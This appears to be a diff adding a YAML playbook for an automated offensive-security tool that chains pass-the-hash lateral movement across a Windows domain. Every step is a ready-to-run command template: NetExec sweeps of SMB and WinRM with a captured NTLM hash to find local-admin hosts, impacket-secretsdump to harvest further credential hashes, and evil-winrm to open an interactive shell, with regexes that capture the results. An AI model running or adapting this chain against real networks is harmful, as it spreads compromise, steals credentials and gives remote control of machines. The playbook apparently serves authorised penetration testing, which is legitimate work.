@@ -1,0 +1,81 @@
+id: pth-lateral-spread
+name: "Lateral — Pass-the-Hash spread + Pwn3d! discovery"
+description: >
+  With a captured NTLM hash, sweep every reachable Windows host to find
+  where the principal has local-admin (the famous `(Pwn3d!)` marker), then
+  open a shell on the first hit. Bread-and-butter lateral movement.
+tags: [pass-the-hash, lateral-movement, pwn3d, smb, winrm]
+difficulty: easy
+
+inputs:
+  - name: target_subnet
+    description: "CIDR or single IP — usually the AD subnet."
+    required: true
+  - name: user
+    description: "The principal that owns the NT hash."
+    source: target_context.user
+    required: true
+  - name: hash
+    description: "Captured NTLM hash (32 hex chars or LM:NT)."
+    source: target_context.hash
+    required: true
+  - name: domain
+    source: target_context.domain
+
+steps:
+  - id: spray_hash_smb
+    name: "Sweep SMB with the hash, look for Pwn3d!"
+    inline_command: "nxc smb <subnet> -u '<user>' -H '<hash>' -d '<domain>' --continue-on-success"
+    inputs:
+      subnet: "${target_subnet}"
+      user: "${user}"
+      hash: "${hash}"
+      domain: "${domain}"
+    capture:
+      - var: pwn3d_hosts
+        regex: '^SMB\s+(\S+)\s+\d+\s+\S+\s+\[\+\][^\n]*\(Pwn3d!\)'
+        match: all
+
+  - id: sweep_winrm
+    name: "Also try WinRM (some hosts only expose 5985)"
+    inline_command: "nxc winrm <subnet> -u '<user>' -H '<hash>' -d '<domain>'"
+    inputs:
+      subnet: "${target_subnet}"
+      user: "${user}"
+      hash: "${hash}"
+      domain: "${domain}"
+
+  - id: dump_hashes_on_pwn3d
+    name: "secretsdump on a Pwn3d! host → snowball more creds"
+    inline_command: "impacket-secretsdump -hashes ':<hash>' '<domain>/<user>'@<pwn3d_host>"
+    requires: [pwn3d_hosts]
+    inputs:
+      domain: "${domain}"
+      user: "${user}"
+      hash: "${hash}"
+    notes: |
+      One Pwn3d! → SAM/LSA dump → new NT hashes → re-run this chain with
+      each new identity. Common Active Directory pivot pattern.
+    capture:
+      - var: ntlm_hashes
+        regex: '^([A-Za-z0-9._$-]+):(\d+):([a-f0-9]{32}):([a-f0-9]{32}):::'
+        match: all
+        groups: { user: 1, rid: 2, lm: 3, nt: 4 }
+
+  - id: shell
+    name: "Open an interactive shell on the Pwn3d! host"
+    inline_command: "evil-winrm -i <pwn3d_host> -u '<user>' -H '<hash>'"
+    requires: [pwn3d_hosts]
+    inputs:
+      user: "${user}"
+      hash: "${hash}"
+    notes: |
+      Prefer WinRM (5985) for an interactive PowerShell. Fall back to
+      `impacket-psexec` / `wmiexec` / `atexec` with the same hash if WinRM
+      isn't open.
+
+references:
+  - title: "HackTricks — Pass-the-Hash"
+    url:   "https://book.hacktricks.wiki/en/windows-hardening/ntlm/index.html"
+  - title: "NetExec — SMB"
+    url:   "https://www.netexec.wiki/smb-protocol"
